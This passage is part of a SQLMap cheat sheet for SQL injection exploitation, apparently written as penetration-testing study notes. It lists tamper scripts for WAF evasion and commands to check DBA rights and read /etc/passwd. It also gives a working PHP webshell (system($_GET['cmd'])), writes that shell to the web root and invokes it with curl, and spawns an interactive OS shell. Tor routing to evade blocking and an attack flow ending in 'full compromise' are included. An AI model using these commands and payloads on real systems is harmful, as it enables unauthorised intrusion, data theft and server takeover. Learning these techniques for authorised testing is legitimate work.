# Use specific tamper scripts:
sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase

Why: Tamper scripts modify payloads before sending to bypass WAF signatures. They can be chained — multiple scripts run in priority order.

💻 OS Exploitation

Check for DBA Privileges

sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

Why: DBA (Database Administrator) privileges are required to read/write files and execute OS commands. If current user is DBA: True, you can proceed with OS exploitation.

Read a Local File

sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

Why: If you have DBA rights and the LOAD DATA privilege, you can read any file the database process can access. /etc/passwd reveals usernames, /etc/shadow (if readable) has password hashes, app config files may have DB credentials.
What next: Find the file at ~/.sqlmap/output/<target>/files/_etc_passwd and cat it.

Write a File (Webshell Upload)

# First, create your payload locally:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Then write it to the web server:
sqlmap -u "http://www.example.com/?id=1" \
  --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php"

Why: If the DBMS can write to the web root (requires DBA + INTO OUTFILE privilege + secure-file-priv disabled), you can upload a PHP webshell.
What next: Access it with:
bash curl http://www.example.com/shell.php?cmd=ls+-la
Note: Modern DBMSes disable file-write by default. This requires misconfiguration.

Spawn an Interactive OS Shell

# Basic attempt (tries UNION technique by default):
sqlmap -u "http://www.example.com/?id=1" --os-shell

# Specify technique if UNION fails (Error-based often works better):
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

Why: Gives you an interactive command shell on the remote server without manually uploading a webshell. SQLMap handles everything — writing stager files, creating UDFs (user-defined functions), etc.
What next: Once inside the shell, run id, whoami, cat /etc/passwd, network recon, etc.
Note: SQLMap will ask for the web language (PHP/ASP/JSP) and writable directory. In batch mode (--batch), it uses PHP and common web root locations by default.

🎭 Tamper Scripts Reference

Use sqlmap --list-tampers to see the full list with descriptions.

Tamper Script What it does
0eunion Replaces UNION with e0UNION
base64encode Base64-encodes the entire payload
between Replaces > with NOT BETWEEN 0 AND # and = with BETWEEN # AND #
commalesslimit Converts LIMIT M, N to LIMIT N OFFSET M (MySQL compatibility)
equaltolike Replaces = with LIKE
halfversionedmorekeywords Adds MySQL versioned comments before each keyword
modsecurityversioned Wraps entire query in MySQL versioned comment
modsecurityzeroversioned Wraps entire query in MySQL zero-versioned comment
percentage Adds % before each character (SELECT → %S%E%L%E%C%T)
plus2concat Replaces + with MSSQL CONCAT()
randomcase Randomizes keyword casing (SELECT → SEleCt)
space2comment Replaces spaces with /**/
space2dash Replaces spaces with --<random>\n
space2hash Replaces spaces (MySQL) with #<random>\n
space2mssqlblank Replaces spaces (MSSQL) with random valid blank characters
space2plus Replaces spaces with +
space2randomblank Replaces spaces with random blank characters
symboliclogical Replaces AND/OR with &&/\|\|
versionedkeywords Wraps non-function keywords in MySQL versioned comments
versionedmorekeywords Wraps all keywords in MySQL versioned comments

Protection Bypass

Command Description When to use
sqlmap -u "..." --data="id=1&csrftoken=..." --csrf-token="csrf-token" Anti-CSRF bypass Form with CSRF protection
sqlmap --list-tampers List tamper scripts Choosing the right bypass
sqlmap -u "..." --random-agent Random User-Agent WAF blocking SQLMap UA
sqlmap -u "..." --tor --check-tor Route via Tor IP blacklisting

OS Exploitation

Command Description When to use
sqlmap -u "..." --is-dba Check DBA privileges Before attempting file ops
sqlmap -u "..." --file-read "/etc/passwd" Read server file DBA privilege confirmed
sqlmap -u "..." --file-write "shell.php" --file-dest "/var/www/html/shell.php" Write webshell DBA + file write enabled
sqlmap -u "..." --os-shell Interactive OS shell Full compromise

🧠 Key Concepts Summary

The Attack Flow

1. Find potential injection point (URL param, form field, header, cookie)
2. Run basic SQLMap scan → detect injection type + DBMS
3. Enumerate: DB name → tables → columns → dump data
4. Look for credentials → try to crack hashes
5. If DBA → attempt file read → attempt OS shell

Output Location

All SQLMap output is stored at:

~/.sqlmap/output/<target-hostname>/
  • Session files (avoid re-testing known params)
  • Dump files (CSV exports of table data)
  • Log files (all traffic if -t used)

Session Resumption

SQLMap stores injection point info in session files. On subsequent runs against the same target, it skips re-detection and goes straight to enumeration. This saves significant time.

--all --batch (Nuclear Option)

sqlmap -u "http://target.com/?id=1" --all --batch

Automatically enumerates and retrieves everything accessible — all databases, tables, columns, data, hashes. Can run for a very long time. Use sparingly and check output files manually afterward.

🔗 Quick Reference Links

  • SQLMap Official Site: http://sqlmap.org
  • SQLMap GitHub: https://github.com/sqlmapproject/sqlmap
  • SQLMap Wiki (Official Manual): https://github.com/sqlmapproject/sqlmap/wiki
  • Tor Project Check: https://check.torproject.org/
